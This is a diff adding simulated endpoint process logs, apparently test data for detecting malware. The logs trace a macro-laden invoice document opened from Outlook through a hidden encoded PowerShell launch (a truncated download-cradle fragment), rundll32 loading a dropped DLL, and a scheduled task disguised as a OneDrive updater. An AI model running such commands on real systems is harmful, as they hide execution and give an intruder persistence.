@@ -1,0 +1,6 @@
+{"timestamp": "2026-10-14T08:23:00+00:00", "host": "WS-FIN-017", "user": "mrivera", "parent": "explorer.exe", "image": "OUTLOOK.EXE", "command_line": "OUTLOOK.EXE"}
+{"timestamp": "2026-10-14T08:23:40+00:00", "host": "WS-FIN-017", "user": "mrivera", "parent": "OUTLOOK.EXE", "image": "WINWORD.EXE", "command_line": "WINWORD.EXE /n \"C:\\Users\\mrivera\\Downloads\\Invoice_Q3_8812.docm\""}
+{"timestamp": "2026-10-14T08:24:02+00:00", "host": "WS-FIN-017", "user": "mrivera", "parent": "WINWORD.EXE", "image": "cmd.exe", "command_line": "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "severity": "high"}
+{"timestamp": "2026-10-14T08:24:03+00:00", "host": "WS-FIN-017", "user": "mrivera", "parent": "cmd.exe", "image": "powershell.exe", "command_line": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "severity": "high"}
+{"timestamp": "2026-10-14T08:26:00+00:00", "host": "WS-FIN-017", "user": "mrivera", "parent": "powershell.exe", "image": "rundll32.exe", "command_line": "rundll32.exe C:\\Users\\Public\\upd.dll,Start", "severity": "high"}
+{"timestamp": "2026-10-14T08:55:00+00:00", "host": "WS-FIN-017", "user": "mrivera", "parent": "rundll32.exe", "image": "schtasks.exe", "command_line": "schtasks /create /tn OneDriveUpd /tr C:\\Users\\Public\\upd.dll /sc minute /mo 15", "severity": "medium"}
